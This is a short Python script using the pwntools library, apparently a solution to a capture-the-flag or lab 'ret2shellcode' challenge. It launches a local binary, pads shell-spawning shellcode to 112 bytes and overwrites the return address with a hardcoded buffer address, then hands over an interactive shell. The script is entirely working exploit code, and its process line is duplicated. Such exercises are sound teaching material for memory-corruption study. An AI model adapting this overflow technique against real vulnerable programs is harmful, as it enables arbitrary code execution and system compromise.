from pwn import *

sh = process('./ret2shellcode')

sh = process('./ret2shellcode')

shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
sh.interactive()
